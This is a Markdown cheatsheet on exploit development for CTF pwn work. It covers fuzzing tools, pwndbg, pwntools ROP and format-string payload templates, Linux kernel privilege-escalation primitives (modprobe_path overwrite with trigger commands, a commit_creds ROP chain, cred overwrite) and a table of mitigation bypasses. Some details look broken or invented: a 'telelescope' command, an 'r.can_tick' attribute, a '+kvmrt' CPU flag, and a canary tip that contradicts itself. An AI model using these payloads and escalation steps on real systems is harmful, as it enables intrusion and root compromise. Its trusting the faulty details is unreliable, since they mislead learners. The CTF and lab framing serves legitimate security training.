# Zero-Day Exploit Development Cheatsheet

---

## Vulnerability Class Taxonomy

| Class | Primitive | Key Exploitation Approach |
|-------|-----------|--------------------------|
| Stack Buffer Overflow | Arbitrary write past saved RIP | ROP chain, ret2libc, stack pivot |
| Heap Buffer Overflow | Overwrite adjacent heap metadata | Fastbin/tcache poison, House of Force |
| Off-by-One | Null byte or single-byte overwrite | Off-by-one RBP overwrite, consolidation |
| Use-After-Free | Access freed object, type confusion | Reclaim freed slot (msg_msg, tty_struct), hijack vtable |
| Double Free | Free same pointer twice | tcache/fastbin dup, write-what-where |
| Format String | `%n` write, `%x` leak | Arbitrary write via `%hn`/`%hhn`, leak canary/libc |
| Integer Overflow | Wraparound in size/length calc | Heap overflow via miscomputed allocation, index OOB |
| Type Confusion | Cast object to wrong type | Overlap structs, access privileged fields |
| Race Condition (TOCTOU) | Window between check and use | userfaultfd/FUSE to pause, heap spray during window |
| Uninitialized Memory | Stack/heap data leaks | Leak canaries, pointers, kernel addresses |
| NULL Pointer Dereference | Execute at page 0 | mmap(0) to map NULL page, redirect control flow |
| Race / Concurrency | Interleaved execution paths | userfaultfd to stall, double-fetch, io_uring races |

---

## Fuzzing Tools Quick Reference

### AFL++
```bash
# Build target with AFL++ instrumentation
CC=afl-clang-lto CXX=afl-clang-lto++ ./configure && make

# Basic fuzzing
afl-fuzz -i corpus/ -o findings/ -- ./target @@

# Parallel fuzzing (main + secondary)
afl-fuzz -i corpus/ -o findings/ -M main -- ./target @@   # terminal 1
afl-fuzz -i corpus/ -o findings/ -S s1 -- ./target @@     # terminal 2

# QEMU mode (binary-only)
afl-fuzz -Q -i corpus/ -o findings/ -- ./target @@

# With CMPLOG for magic-byte bypass
AFL_CMPLOG=1 afl-fuzz -i corpus/ -o findings/ -M main -- ./target @@

# Persistent mode harness
__AFL_FUZZ_INIT(); while(__AFL_LOOP(10000)) { target_parse(buf, len); }

# Key flags
-i <dir>              # input corpus
-o <dir>              # output directory
-M <name>             # main fuzzer (deterministic)
-S <name>             # secondary fuzzer (stochastic)
-m none               # no memory limit
-t <ms>               # timeout per input (default 1000)
-d                    # skip deterministic phase
```

### libFuzzer
```c
// Harness
int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {
    if (size < 4) return 0;
    target_parse(data, size);
    return 0;
}
```
```bash
# Build & run
clang -g -fsanitize=fuzzer,address -o fuzz_target fuzz_target.c
./fuzz_target corpus/ -dict=my.dict -max_len=4096 -jobs=4 -workers=4

# Key flags
-max_len=N            # max input size
-dict=file.dict       # dictionary tokens
-jobs=N               # parallel jobs
-timeout=N            # per-input timeout (seconds)
-merge=1              # merge corpora
```

### syzkaller (Kernel Fuzzing)
```bash
# Generate config
./syz-manager -config=syzkaller.cfg

# Key config fields
{
    "target": "linux/amd64",
    "http":   "127.0.0.1:56741",
    "workdir": "./workdir",
    "kernel_obj": "./linux-obj/",
    "image":  "./stretch.img",
    "syzkaller": "./syzkaller/",
    "type": "qemu",
    "vm": { "count": 4, "cpu": 2, "mem": 2048 }
}

# Description files define syscall templates
# Key flags: -cover=1 (kcov), -sandbox=namespace
```

### honggfuzz
```bash
# Build with hfuzz-clang
CC=hfuzz-clang make

# Continuous feedback-driven mode
honggfuzz -i corpus/ -o findings/ -- ./target @@

# Key flags
-s                    # persistent mode
-n N                  # number of concurrent workers
--linux_addr2line     # symbolize crashes
--tmout_sigsegv N     # timeout for SIGSEGV
```

---

## GDB / pwndbg Cheat Sheet

### Essential Commands
| Command | Purpose |
|---------|---------|
| `context` | Show regs + stack + disasm + code at PC |
| `vmmap` | Virtual memory map (`/proc/pid/maps`) |
| `checksec` | Binary protections (NX, canary, PIE, RELRO) |
| `got` / `gotplt` | Display GOT entries |
| `plt` | Display PLT entries |
| `telelescope <addr> [n]` | Dereference chain starting at addr |
| `stack [n]` | Show n stack qwords |
| `nearpc [n]` | Disassemble n instructions around PC |
| `search <pattern>` | Search memory for pattern |
| `leakfind <start> <end> <offset> <n>` | Find pointer chains |
| `rop --distinct` | Find ROP gadgets |
| `nextcall` | Step until next CALL instruction |
| `stepuntil <insn>` | Step until specific instruction type |
| `varinfo <symbol>` | Show variable type and location |
| `probe <addr>` | Check page permissions at addr |

### Breakpoints & Watchpoints
```gdb
b *0x400789              # break at address
b *main+42               # break at offset from symbol
b *0x400789 if $rax==0   # conditional breakpoint
watch global_ptr         # hardware watchpoint (write)
awatch buf[0]           # watch read AND write
delete 1                 # delete breakpoint 1
```

### Heap Inspection (pwndbg)
```gdb
heap                     # show heap regions
bins                     # show all bins (fast/tcache/small/large/unsorted)
tcache                   # show tcache bins
fastbins                 # show fastbin lists
largebins               # show large bin lists
mergeinfo <addr>         # show chunk merge info
```

### Kernel Debugging
```bash
# Launch QEMU with GDB stub
qemu-system-x86_64 -m 256M -kernel ./bzImage \
  -initrd ./rootfs.cpio -nographic \
  -append "console=ttyS0 nokaslr oops=panic panic=1" \
  -s -S -cpu qemu64,+smep,+smap -no-reboot

# Connect
gdb ./vmlinux -ex "target remote :1234" -ex "continue"
```

---

## pwntools Quick Reference

### Connection Setup
```python
from pwn import *
context.update(arch='amd64', os='linux', log_level='info')

e    = ELF('./vuln')
libc = ELF('./libc.so.6') if args.REMOTE else ELF('/lib/x86_64-linux-gnu/libc.so.6')

def conn():
    if args.REMOTE:   return remote('host', 1337)
    elif args.GDB:    return gdb.debug('./vuln', 'b *main\ncontinue')
    else:             return process('./vuln')

r = conn()
```

### ELF & Symbols
```python
e = ELF('./vuln')
e.symbols['system']          # symbol address
e.got['puts']                # GOT entry address
e.plt['puts']                # PLT stub address
e.search(b'/bin/sh')         # find string in binary
next(e.search(b'/bin/sh'))   # address of /bin/sh string
e.address                    # base address (update after leak)
```

### ROP Chain Building
```python
rop = ROP(e)
rop.call('puts', [e.got['puts']])
rop.call('main')
print(rop.dump())            # display the chain
payload = b'A' * offset + rop.chain()

# With libc (after leak)
libc.address = leaked_puts - libc.symbols['puts']
rop2 = ROP(libc)
rop2.call('system', [next(libc.search(b'/bin/sh'))])
```

### Payload Construction
```python
payload  = b'A' * offset
payload += p64(pop_rdi) + p64(bin_sh)
payload += p64(ret)           # stack alignment
payload += p64(system)

# Format string
payload = f'%{offset}$s'.encode().ljust(8, b'\x00') + p64(got_entry)

# Shellcraft
shellcode = asm(shellcraft.sh())               # Linux /bin/sh
shellcode = asm(shellcraft.cat('flag.txt'))    # cat file
```

### Useful Patterns
```python
# Send/Recv
r.sendline(payload)
r.sendafter(b':', payload)
r.recvuntil(b':')
r.recvline()
r.interactive()

# Leak & parse
leak = u64(r.recv(6).ljust(8, b'\x00'))

# 14-byte functionality
r.clean()                    # clear buffer
r.can_tick = True             # enable timeout

# libc version identification
# Calculate offset: leaked - known_symbol
libc_base  = leaked_puts - libc.symbols['puts']
system     = libc_base + libc.symbols['system']
one_gadget = libc_base + 0xe3b2e    # from one_gadget tool
```

---

## Kernel Exploitation Primitives

### Arb Read Primitive
```c
// Read arbitrary kernel address via OOB read or UAF
// Spray target object, read out-of-bounds to leak:
//   - /proc/kallsyms addresses (KASLR defeat)
//   - cred pointer from task_struct
//   - heap pointers for address corrupt
```

### Arb Write Primitive
```c
// Common targets for arbitrary write:
// 1. modprobe_path — overwrite to "/tmp/x" for auto-root on bad binary
// 2. cred struct — zero uid/gid/euid for current task
// 3. /proc/kallsyms-based function pointer overwrite
```

### modprobe_path Exploit
```c
// Overwrite modprobe_path at kernel base + offset
// 1. Get kernel base (KASLR leak or /proc/kallsyms)
// 2. modprobe_path is ~"0x1440" from _text (check System.map)
// 3. Write "/tmp/x" to modprobe_path
// 4. Create dummy script at /tmp/x that does chmod /flag or cp /flag
// 5. Execute invalid binary → kernel runs /tmp/x as root

// Trigger:
// echo -ne '\xff\xff\xff\xff' > /tmp/dummy
// chmod +x /tmp/dummy && /tmp/dummy   // kernel calls modprobe_path as root
```

### commit_creds / prepare_kernel_cred (ROP)
```c
// Standard kernel ROP chain for LPE:
// pop rdi; ret  → 0
// prepare_kernel_cred  → returns new cred in rax
// mov rdi, rax; ret    → move cred to rdi
// commit_creds         → apply cred to current task

// Then return to userland via:
// KPTI trampoline (preferred): swapgs_restore_regs_and_return_to_usermode + offset
// Manual: swapgs; iretq  (requires CR3 switch on KPTI kernels)
```

### creds Overwrite (Direct)
```c
// If you have arbitrary write and can find current task's cred:
// 1. Read current->cred pointer
// 2. Overwrite uid/gid/euid/egid/fsuid/fsgid to 0
// 3. Optionally set cap_effective to 0xFFFFFFFF
```

### Kernel Spray Targets (SLUB)
| Object | Size | Use Case |
|--------|------|----------|
| `msg_msg` | 0x30–0xFD0 | Flexible size, header gives read/write |
| `pipe_buffer` | 0x280 | Contains ops pointer (vtable hijack) |
| `tty_struct` | 0x2e0 | Contains ops pointer (tty_ops hijack) |
| `seq_operations` | 0x20 | Small, for info leaks |
| `sk_buff` | 0x200–0x500 | Network buffer spray |
| `io_uring` sqe/cqe | varies | io_uring exploitation |
| `timerfd_ctx` | 0x150 | Timer-based spray |

---

## Userspace Exploitation Checklist

### Stack Exploitation
| Step | Action |
|------|--------|
| 1 | `checksec` — identify protections (NX, canary, PIE, RELRO) |
| 2 | `file` — confirm architecture (32/64-bit, static/dynamic) |
| 3 | Find overflow offset — cyclic pattern or manual calculation |
| 4 | Leak canary (format string, fork-based brute, `\x00` overwrite) |
| 5 | Leak libc (puts GOT, format string) |
| 6 | Calculate libc base (`leak - offset`) |
| 7 | Build ROP chain or ret2libc |
| 8 | Handle stack alignment (extra `ret` gadget on 64-bit) |
| 9 | Test locally, then adjust for remote (endianness, padding) |

### Heap Exploitation (glibc)
| Step | Action |
|------|--------|
| 1 | Identify glibc version (`strings libc.so \| grep GLIBC`) — determines available techniques |
| 2 | Determine allocator: check for tcache (glibc ≥ 2.26), safe-linking (≥ 2.32) |
| 3 | Identify vulnerability class (UAF, overflow, double-free, off-by-one) |
| 4 | Choose target: tcache poison (≥2.26), fastbin dup (<2.26), House of Apple/Botcake/Cat (modern) |
| 5 | Heap Feng Shui — allocate/free to position chunks for exploit |
| 6 | Overwrite `__free_hook` or `__malloc_hook` (removed in 2.34+), or target FSOP/FILE |
| 7 | For glibc ≥ 2.34: target `_IO_list_all` + FSOP, or largebin attack for `fsync`/`IO_2_1_stderr_` |

### Format String
| Step | Action |
|------|--------|
| 1 | Determine offset: `AAAA%6$x` — find where your input appears on stack |
| 2 | Leak: `%p` (stack), `%s` (deref), GOT entries for libc |
| 3 | Write: `%n` (4-byte), `%hn` (2-byte), `%hhn` (1-byte) |
| 4 | Chunked writes: write 2 bytes at a time, handle wrapping |
| 5 | Targets: GOT overwrite, canary leak, return address overwrite |

---

## CTF Pwn Workflow

```
┌─────────────────────────────────────────────────────────┐
│                    CTF PWN CHALLENGE                      │
└────────────────────────┬────────────────────────────────┘
                         │
         ┌───────────────▼───────────────┐
         │  STEP 1: RECONNAISSANCE        │
         │  file, checksec, strings,      │
         │  ldd, readelf, nm              │
         └───────────────┬───────────────┘
                         │
         ┌───────────────▼───────────────┐
         │  STEP 2: STATIC ANALYSIS        │
         │  Ghidra/IDA — find vuln        │
         │  Identify: overflow? UAF? fmt? │
         │  Calculate offsets             │
         └───────────────┬───────────────┘
                         │
         ┌───────────────▼───────────────┐
         │  STEP 3: LEAK STRATEGY          │
         │  Need libc base? → GOT leak    │
         │  Need canary? → fmt/brute      │
         │  Need PIE base? → code leak    │
         │  Need heap addr? → leak chunk  │
         └───────────────┬───────────────┘
                         │
         ┌───────────────▼───────────────┐
         │  STEP 4: BUILD EXPLOIT          │
         │  pwntools script:               │
         │  - Connect (local/remote)       │
         │  - Leak addresses               │
         │  - Compute libc offsets          │
         │  - Craft payload (ROP/heap/fmt) │
         │  - Send & catch shell            │
         └───────────────┬───────────────┘
                         │
         ┌───────────────▼───────────────┐
         │  STEP 5: TEST & DEBUG           │
         │  Local → GDB attach            │
         │  Adjust offsets if needed       │
         │  Handle ASLR slide on remote    │
         │  cat flag                       │
         └─────────────────────────────────┘
```

### Kernel CTF Variation
```
┌──────────────────────────────────────────────────┐
│  RECON: checksec on vmlinux (KASLR/SMEP/SMAP)    │
│  ANALYZE: reverse .ko module (Ghidra)            │
│  IDENTIFY: ioctl handlers, race windows, OOB/UAF │
│  SPRAY: msg_msg / pipe_buffer / tty to reclaim   │
│  EXPLOIT: arb write → modprobe_path or cred       │
│  ESCAPE: swapgs + iretq or KPTI trampoline        │
└──────────────────────────────────────────────────┘
```

---

## Mitigation Bypass Techniques

| Mitigation | What It Blocks | Bypass Technique |
|------------|---------------|-----------------|
| **NX/DEP** | Shellcode on stack/heap | ROP, ret2libc, ret2plt, mprotect shellcode |
| **ASLR** | Hardcoded addresses | Info leak (GOT, format string, heap ptr), partial overwrite (12-bit brute), ret2plt (PLT is at fixed offset from PIE base) |
| **Stack Canary** | Linear buffer overflow overwriting RIP | Leak via format string (`%p`), fork-based brute force (same canary across fork), overwrite GOT/other targets instead |
| **PIE** | Known code section addresses | Leak any code pointer (ret addr on stack, GOT entry), partial overwrite (keep upper bytes, flip lower 12 bits) |
| **Full RELRO** | GOT overwrites | Target `__malloc_hook`/`__free_hook` (removed glibc 2.34+), target `_IO_list_all`/FSOP, target `__exit_funcs`, overwriting return addresses instead |
| **SMEP** (kernel) | ret2user (exec user pages from ring 0) | Kernel ROP chain (stay in ring 0 code), `ropper --search "pop rdi"` |
| **SMAP** (kernel) | Access user memory from ring 0 | Copy data to kernel via `copy_from_user` gadgets, use kernel ROP that only touches kernel addresses |
| **KASLR** (kernel) | Known kernel addresses | Leak from `/proc/kallsyms` (if readable), dmesg, heap pointer leak, uninitialized memory read |
| **KPTI** (kernel) | Meltdown-class attacks; separates user/kernel PGD | Use KPTI trampoline for return to userland, or `signal()` based return |
| **seccomp** | Syscall filtering | Identify allowed syscalls (`seccomp-tools dump`), use `openat/read/write` instead of `open/read/write`, ORW chain via allowed calls |

### Canary Leak Decision Tree
```
Format string bug? ── Yes → %p leak canary from stack offset
                  └── No
Fork-based server? ── Yes → Bruteforce byte-by-byte (256×8 worst case)
                   └── No
Partial overwrite? ── Yes → Overwrite 1-2 bytes of EIP past canary
                   └── No
Can avoid canary? ── Yes → Target GOT/heap/BSS instead of return addr
```

---

## Docker & Lab Setup Commands

### Quick PWN Container
```bash
# Pull and run
docker run -it --rm \
  --security-opt seccomp=unconfined \
  --security-opt apparmor=unconfined \
  -v $(pwd):/pwn \
  -p 9999:9999 \
  ubuntu:22.04 bash

# Inside container: install tools
apt update && apt install -y gcc gdb python3 pip socat libc6-dbg
pip3 install pwntools
```

### Dockerfile for CTF Challenges
```dockerfile
FROM ubuntu:22.04
RUN apt-get update && apt-get install -y \
    gcc-multilib libc6-dbg libc6-dev-i386 \
    gdb python3 python3-pip socat && rm -rf /var/lib/apt/lists/*
RUN pip3 install pwntools
RUN useradd -m -s /bin/bash ctf
USER ctf
WORKDIR /home/ctf
EXPOSE 9999
CMD ["socat", "TCP-LISTEN:9999,reuseaddr,fork", "EXEC:/home/ctf/chal"]
```

### Kernel CTF QEMU Launch
```bash
#!/bin/bash
qemu-system-x86_64 \
    -m 256M \
    -kernel ./bzImage \
    -initrd ./rootfs.cpio \
    -nographic \
    -append "console=ttyS0 loglevel=3 oops=panic panic=1 nokaslr" \
    -monitor /dev/null \
    -s -S \
    -cpu qemu64,+smep,+smap \
    -no-reboot
# GDB: target remote localhost:1234
# Remove -S to boot without waiting for debugger
# Remove nokaslr for realistic KASLR
# Add -cpu qemu64,+smep,+smap,+kvmrt for full mitigations
```

### Extract & Modify rootfs for Kernel CTF
```bash
mkdir rootfs && cd rootfs
gzip -dc ../rootfs.cpio.gz | cpio -idm
# Or:
gunzip < ../rootfs.cpio.gz | cpio -idm

# Add your exploit
cp ../exploit.c .
# Edit init script (add setuid, disable protections, etc.)
vi init

# Repack
find . | cpio -o -H newc > ../rootfs_new.cpio
gzip ../rootfs_new.cpio
```

### Essential One-Liners
```bash
# checksec
checksec --file=./vuln

# one_gadget (find execve constraints in libc)
one_gadget ./libc.so.6

# patchelf (change interpreter/rpath for local libc)
patchelf --set-interpreter ./ld-linux-x86-64.so.2 --set-rpath . ./vuln

# seccomp-tools (inspect sandbox)
seccomp-tools dump ./vuln

# ROPgadget chain generation
ROPgadget --binary ./vuln --ropchain

# ropper search
ropper --file ./vmlinux --search "pop rdi; ret"

# pwntools disasm
python3 -c "from pwn import *; print(disasm(b'\x90\x31\xc0\x0f\x05'))"

# Extract vmlinux from compressed image
./scripts/extract-vmlinux /boot/vmlinuz-$(uname -r) > vmlinux
```